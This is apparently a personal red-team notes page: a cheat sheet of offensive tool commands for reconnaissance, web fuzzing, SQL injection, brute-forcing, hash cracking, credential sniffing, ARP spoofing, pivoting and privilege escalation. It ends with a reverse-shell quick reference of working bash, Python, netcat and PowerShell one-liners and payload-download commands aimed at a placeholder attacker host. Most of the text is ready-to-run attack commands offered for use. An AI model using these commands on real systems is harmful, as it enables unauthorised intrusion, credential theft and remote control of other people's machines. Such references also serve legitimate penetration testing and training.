---
type: section
room: red
tags: [red/instruments]
---

# Red: Instruments

> [!quote]
> *"When you have a tool for every problem, it is only a matter of choosing the right one."*

The working kit for offensive operations. Every tool documented here follows the pattern: **what it does → key flags → most-used commands → OPSEC notes**.

---

## Inventory by Phase

| Phase | Tools |
|-------|-------|
| Reconnaissance & Sniffing | [[Red/Instruments/nmap\|nmap]], masscan, amass, subfinder, theHarvester, shodan, whatweb, dnsx, wafw00f, nuclei, [[Red/Instruments/tcpdump\|tcpdump]], [[Red/Instruments/wireshark\|wireshark / tshark]] |
| Web Exploitation | [[Red/Instruments/gobuster\|gobuster]], [[Red/Instruments/ffuf\|ffuf]], [[Red/Instruments/burpsuite\|burpsuite]], [[Red/Instruments/sqlmap\|sqlmap]], feroxbuster, wfuzz, nikto |
| Exploitation | metasploit, searchsploit, pwntools |
| Adversary-in-the-Middle | [[Red/Instruments/bettercap\|bettercap / ettercap]], [[Red/Instruments/responder\|responder]] |
| Credential Access | [[Red/Instruments/hydra\|hydra]], [[Red/Instruments/hashcat\|hashcat]], john, [[Red/Instruments/netexec\|netexec]], mimikatz, secretsdump, [[Red/Instruments/responder\|responder]] |
| Privilege Escalation | [[Red/Instruments/linpeas\|linpeas / winpeas]], pspy, powerup, les, wesng, bloodhound |
| Post-Exploitation & Pivoting | netcat, socat, [[Red/Instruments/chisel\|chisel]], ligolo-ng, evil-winrm, impacket, [[Red/Instruments/ssh\|ssh / scp / sftp]] |

---

## 🔍 nmap

**Purpose:** Port scanning, service detection, OS fingerprinting, script scanning.

```bash
# Quick scan — top 1000 ports
nmap <target>

# Full port scan (all 65535) — fast
nmap -sS -p- --min-rate 5000 -oA recon/nmap-all <target>

# Service + script scan on specific ports
nmap -sC -sV -p 22,80,443,8080 -oA recon/nmap-detail <target>

# OS detection
nmap -O <target>

# UDP top 100 ports
nmap -sU --top-ports 100 <target>

# Aggressive (all checks, very noisy)
nmap -A <target>

# Scan a full subnet
nmap -sn 10.10.10.0/24 -oG - | grep Up | awk '{print $2}'

# Script categories
nmap --script vuln <target>            # vulnerability scripts
nmap --script smb-enum-shares <target> # SMB shares
nmap --script http-enum <target>       # web directory enum
nmap --script ftp-anon <target>        # anonymous FTP check

# Output formats
nmap ... -oA output    # all formats (nmap, gnmap, xml)
nmap ... -oX out.xml   # XML (parseable)
nmap ... -oG out.gnmap # greppable
```

**Key Flags:**

| Flag | Meaning |
|------|---------|
| `-sS` | SYN scan (stealth, needs root) |
| `-sT` | TCP connect (no root needed) |
| `-sU` | UDP scan |
| `-sV` | Version detection |
| `-sC` | Default scripts |
| `-A` | Aggressive (OS + version + scripts + traceroute) |
| `-p-` | All 65535 ports |
| `-p <list>` | Specific ports e.g. `-p 22,80,443` |
| `--min-rate` | Min packets/sec |
| `-oA <name>` | Output all formats |
| `-Pn` | Skip host discovery (skip ping) |
| `-n` | No DNS resolution |
| `--open` | Show only open ports |

---

## 🦈 tcpdump

**Purpose:** Command-line packet sniffer and network traffic analyzer for credential harvesting and network inspection.

```bash
# Capture packets on a specific interface displaying contents in ASCII
sudo tcpdump -i eth0 -A

# Sniff cleartext credentials on common legacy ports (POP3, Telnet, HTTP, FTP)
sudo tcpdump port 110 -A          # POP3 credentials
sudo tcpdump port 23 -A           # Telnet cleartext session
sudo tcpdump port 21 -A           # FTP USER / PASS
sudo tcpdump port 80 -A           # HTTP headers, POST logins

# Capture traffic to or from a specific host
sudo tcpdump host 10.10.10.50 -A

# Capture traffic on a specific subnet
sudo tcpdump net 192.168.1.0/24 -n

# Output packets in Hex and ASCII
sudo tcpdump -XX port 21

# Write captured packets to a PCAP file
sudo tcpdump -i eth0 -w /tmp/capture.pcap port 80 or port 21

# Read and dissect a previously saved PCAP file
tcpdump -r capture.pcap -A
tcpdump -r capture.pcap -qns 0 -X

# Useful filtering combinations (BPF syntax)
sudo tcpdump -i any 'tcp[tcpflags] & (tcp-syn) != 0'   # Capture only SYN packets
sudo tcpdump -n -s 0 -c 1000 -w scan.pcap             # First 1000 full packets
```

**Key Flags:**

| Flag | Meaning |
|------|---------|
| `-i <iface>` | Capture on interface (e.g. `eth0`, `any`) |
| `-A` | Print packet payload in ASCII (indispensable for cleartext passwords) |
| `-X` / `-XX` | Print payload in hex and ASCII (including link header with `-XX`) |
| `-w <file>` | Write raw packets to PCAP file |
| `-r <file>` | Read raw packets from PCAP file |
| `-n` | Do not resolve IP addresses to hostnames |
| `-nn` | Do not resolve hostnames or port names |
| `-v` / `-vv` | Verbose packet decoding |
| `-s 0` | Set snapshot length to maximum (capture entire packet) |
| `-c <count>` | Stop after capturing specified number of packets |

---

## 🦈 Wireshark / tshark (Offensive Sniffing)

**Purpose:** Packet analysis and credential extraction via GUI (`wireshark`) or CLI (`tshark`).

```bash
# CLI live capture of cleartext protocol data with tshark
tshark -i eth0 -f "port 110" -Y "pop" -T fields -e text

# Extract HTTP POST credentials from a PCAP file
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data

# Dump all unique DNS queries from capture
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort -u

# Extract cleartext credentials across multiple protocols
tshark -r capture.pcap -Y "ftp.request.command == USER or ftp.request.command == PASS"
```

**Essential Display Filters for Credential Harvesting:**
- `pop` or `imap` — Email authentication and message exchange
- `telnet` — Unencrypted terminal sessions
- `ftp` — Cleartext FTP commands and file listings
- `http.authbasic` or `http.request.method == "POST"` — Web logins
- `data-text-lines contains "password"` — Raw strings containing passwords

---

## 🌐 gobuster

**Purpose:** Directory/file brute-forcing and DNS subdomain enumeration.

```bash
# Directory brute-force
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster-dir.txt

# With file extensions
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -o gobuster-ext.txt

# Subdomain enumeration
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -o gobuster-dns.txt

# VHOST enumeration
gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# Useful flags
gobuster dir -u <url> -w <wordlist> -t 50 -r -k --no-error -q
# -t threads  -r follow redirects  -k skip TLS verify  -q quiet
```

---

## ⚡ ffuf

**Purpose:** Fast web fuzzer — directories, parameters, subdomains, anything.

```bash
# Directory discovery
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403

# With extensions
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -e .php,.html,.txt,.bak

# Parameter fuzzing (GET)
ffuf -u "http://<target>/page.php?FUZZ=value" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# POST body fuzzing
ffuf -u http://<target>/login -X POST -d "username=admin&password=FUZZ" -w /usr/share/wordlists/rockyou.txt -fc 401

# Subdomain fuzzing
ffuf -u http://FUZZ.<domain>/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fc 301 -fs 0

# Filter by size / status / words
# -mc 200,301  -fc 404  -fs 1234  -fw 10

# Output to file
ffuf ... -o results.json -of json
```

---

## 🕷️ Burp Suite

**Purpose:** Web application proxy — intercept, modify, replay, scan.

```
# Most important shortcuts
Ctrl+I       → Send to Intruder
Ctrl+R       → Send to Repeater
Ctrl+Shift+U → URL-decode selection
Ctrl+Shift+B → Base64-encode selection

# Quick workflow:
1. Set browser proxy → 127.0.0.1:8080
2. Intercept ON → browse target → Intercept OFF
3. Proxy > HTTP history → right-click → Send to Repeater
4. Modify request in Repeater → Ctrl+Space to send
```

**Intruder Attack Types:**
| Type | Use Case |
|------|---------|
| Sniper | One payload list, one position |
| Battering Ram | Same payload in all positions |
| Pitchfork | Parallel lists, one per position |
| Cluster Bomb | All combinations of lists |

```
# Common Intruder payloads:
Wordlists → /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
Numbers   → 1 to 9999 (IDOR testing)
```

---

## 💉 sqlmap

**Purpose:** Automated SQL injection detection and exploitation.

```bash
# Basic GET injection test
sqlmap -u "http://<target>/page.php?id=1" --batch

# POST injection test
sqlmap -u "http://<target>/login" --data="user=admin&pass=test" --batch

# With session cookie (authenticated)
sqlmap -u "http://<target>/page.php?id=1" --cookie="PHPSESSID=xxx" --batch

# Enumerate databases
sqlmap -u "http://<target>/page.php?id=1" --dbs --batch

# Enumerate tables in a database
sqlmap -u "..." -D <database> --tables --batch

# Dump a specific table
sqlmap -u "..." -D <database> -T <table> --dump --batch

# Try to get OS shell (if DBА privileges)
sqlmap -u "..." --os-shell --batch

# Increase detection level (noisier)
sqlmap -u "..." --level=5 --risk=3 --batch

# Using a saved request from Burp
sqlmap -r request.txt --batch
```

---

## 🔑 hydra

**Purpose:** Fast, multi-threaded network logon cracker supporting 50+ protocols (SSH, FTP, HTTP, IMAP, SMB, etc.).

```bash
# Attack SSH service with a single user and wordlist
hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.10.50 ssh

# Attack FTP with username and password lists
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.10.50 ftp

# Attack IMAP service (e.g. mail accounts)
hydra -l lazie -P /usr/share/wordlists/rockyou.txt 10.10.10.50 imap

# Attack non-standard port with custom speed/threads
hydra -l admin -P passwords.txt -s 2222 -t 16 10.10.10.50 ssh

# Stop after finding the first valid pair (-f) and show attempts (-vV)
hydra -l mark -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.10.50 ssh

# HTTP POST form brute-forcing
hydra -l admin -P passwords.txt 10.10.10.50 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=Login failed"

# HTTP Basic Auth
hydra -l admin -P passwords.txt 10.10.10.50 http-get /admin/
```

**Key Flags:**

| Flag | Meaning |
|------|---------|
| `-l <user>` | Single username to test |
| `-L <file>` | Wordlist of usernames |
| `-p <pass>` | Single password to test |
| `-P <file>` | Wordlist of passwords |
| `-s <port>` | Non-default service port |
| `-t <threads>` | Parallel connection tasks (default 16, lower for stable SSH e.g. 4) |
| `-f` | Exit immediately when a valid login is found |
| `-v` / `-V` / `-vV` | Verbose / show login+password for each attempt |
| `-w <wait>` | Wait time between requests (rate limiting evasion) |
| `-o <file>` | Output found credentials to file |

---

## 🔑 hashcat

**Purpose:** GPU-accelerated password cracking.

```bash
# MD5
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# SHA1
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLMv2 (Responder captures)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberoast (TGS-REP)
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# ASREPRoast (AS-REP)
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

# Rules (add complexity)
hashcat -m 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (pattern-based)
hashcat -m 0 hashes.txt -a 3 ?u?l?l?l?d?d?d?d  # Capital + 3 lower + 4 digits

# Show cracked
hashcat -m 0 hashes.txt --show

# Identify hash type
hashcat --identify hashes.txt
```

**Hash Mode Reference:**
| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | SHA-512 Unix ($6$) |
| 3200 | bcrypt |
| 5600 | NTLMv2 |
| 13100 | Kerberos TGS |
| 18200 | Kerberos AS-REP |

---

## 🏹 netexec (nxc) / crackmapexec

**Purpose:** Multi-protocol network assessment — SMB, WinRM, SSH, RDP, LDAP.

```bash
# SMB — basic auth check
nxc smb <target_range> -u <user> -p <pass>

# SMB — password spray (careful of lockout!)
nxc smb <target> -u users.txt -p 'Password123!' --continue-on-success

# SMB — pass-the-hash
nxc smb <target> -u Administrator -H <ntlm_hash>

# SMB — enumerate shares
nxc smb <target> -u <user> -p <pass> --shares

# SMB — dump SAM
nxc smb <target> -u <user> -p <pass> --sam

# SMB — run command
nxc smb <target> -u <user> -p <pass> -x "whoami"

# WinRM — interactive shell
nxc winrm <target> -u <user> -p <pass>

# LDAP — user enumeration
nxc ldap <target> -u <user> -p <pass> --users

# LDAP — password policy (before spraying!)
nxc smb <target> -u <user> -p <pass> --pass-pol

# Generate relay target list
nxc smb <target_range> --gen-relay-list relay.txt
```

---

## 🩸 Responder

**Purpose:** LLMNR/NBT-NS/mDNS poisoner — captures NTLMv2 hashes passively.

```bash
# Start poisoning on interface
responder -I eth0

# Aggressive mode (respond to everything)
responder -I eth0 -rdw

# Analyse mode only (listen, don't poison — for detection)
responder -I eth0 -A

# Captured hashes saved to:
cat /usr/share/responder/logs/*.txt

# Crack with hashcat
hashcat -m 5600 /usr/share/responder/logs/NTLMv2-*.txt /usr/share/wordlists/rockyou.txt
```

---

## 🩸 linpeas / winpeas

**Purpose:** Automated privilege escalation enumeration.

```bash
# Linux — download and run
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# OR: wget -qO linpeas.sh <url> && chmod +x linpeas.sh && ./linpeas.sh

# Pipe to file for later review
./linpeas.sh 2>/dev/null | tee linpeas.out

# Linux exploit suggester
./linux-exploit-suggester.sh

# Windows — drop and run (PowerShell)
.\winpeas.exe > winpeas.txt
.\winpeas.exe quiet cmd fast > winpeas-fast.txt

# Windows — PowerUp
. .\PowerUp.ps1; Invoke-AllChecks | Out-File powerup.txt
```

---

## 🔗 chisel (Tunnelling)

**Purpose:** Fast TCP tunnel over HTTP/S — pivoting through firewalls.

```bash
# Server (attacker)
chisel server --port 8000 --reverse

# Client (target) — reverse SOCKS proxy
./chisel client <attacker_ip>:8000 R:socks

# Client — forward specific port
./chisel client <attacker_ip>:8000 R:3306:127.0.0.1:3306

# Configure proxychains to use SOCKS5 127.0.0.1:1080
# Then:
proxychains nmap -sT <internal_ip>
proxychains evil-winrm -i <internal_ip> -u <user> -p <pass>
proxychains firefox   # browse internal web services
```

---

## 🔐 ssh / scp / sftp

**Purpose:** Encrypted remote command execution, port forwarding, secure file staging, and SOCKS proxying.

```bash
# Basic authenticated interactive shell
ssh mark@10.10.10.50

# Connect on custom port with private key
ssh -p 2222 -i ~/.ssh/id_ed25519 mark@10.10.10.50

# Execute non-interactive command directly on remote host
ssh mark@10.10.10.50 "uname -r; id; cat /etc/os-release"

# Key Generation (Ed25519 recommended)
ssh-keygen -t ed25519 -C "operator@mindpalace"

# Copy public key to remote host for persistent, passwordless access
ssh-copy-id -i ~/.ssh/id_ed25519.pub mark@10.10.10.50

# Local Port Forwarding: access remote internal port 80 through local port 8080
ssh -L 8080:localhost:80 mark@10.10.10.50

# Dynamic SOCKS5 Proxy (Pivot through compromised target)
ssh -D 9050 -N -f mark@10.10.10.50
# (-D: dynamic port, -N: do not execute remote command, -f: send to background)

# Jump Host / Bastion routing
ssh -J jumpuser@bastion.corp.local mark@internal.corp.local

# SCP: Secure file transfer (remote to local)
scp mark@10.10.10.50:/home/mark/evidence.txt ./evidence.txt

# SCP: Secure file transfer (local to remote)
scp -P 2222 linpeas.sh mark@10.10.10.50:/tmp/linpeas.sh

# SFTP: Interactive file transfer
sftp mark@10.10.10.50
```

---

## ⚡ bettercap / ettercap

**Purpose:** Layer 2 / Layer 3 Adversary-in-the-Middle (MITM) attacks, ARP spoofing, DNS spoofing, and rogue gateway positioning.

```bash
# Bettercap interactive session on specific interface
sudo bettercap -iface eth0

# Bettercap eval command (run and execute one-liner)
sudo bettercap -iface eth0 -eval "net.probe on; net.show"

# Bettercap automated caplet script
sudo bettercap -iface eth0 -caplet spoof.cap

# Common Bettercap internal commands:
net.probe on                       # Discover live hosts via mDNS/NetBIOS/ARP
net.show                           # Display LAN host cache
set arp.spoof.targets 10.10.10.50  # Define victim target IP
set arp.spoof.internal true        # Spoof both target and gateway
arp.spoof on                       # Start ARP cache poisoning
net.sniff on                       # Sniff intercepted packets

# Ettercap Text-mode ARP poisoning
sudo ettercap -T -q -i eth0 -M arp:remote /10.10.10.1// /10.10.10.50//
# (-T: Text mode, -q: quiet, -M arp: MITM ARP mode)
```

**Ettercap Interface Options:**
- `-T` — Text-only CLI
- `-C` — Ncurses terminal GUI
- `-G` — Full GTK graphical interface

---

## 🐚 Reverse Shell Quick-Reference

```bash
# Bash
bash -i >& /dev/tcp/<ip>/<port> 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<ip>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (with -e)
nc <ip> <port> -e /bin/bash

# Netcat (FIFO, no -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f

# PowerShell one-liner
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<ip>',<port>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r+='PS '+(pwd).Path+'> ';$rb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length)};$c.Close()"

# Shell upgrade (after catching raw shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → Enter → export TERM=xterm

# File transfer to target
python3 -m http.server 8080   # on attacker
wget http://<attacker>:8080/<file> -O /tmp/<file>
curl -o /tmp/<file> http://<attacker>:8080/<file>
# Windows:
certutil -urlcache -f http://<attacker>:8080/<file> C:\Temp\<file>
```

↩ [[Red]] · [[Mind Palace]]
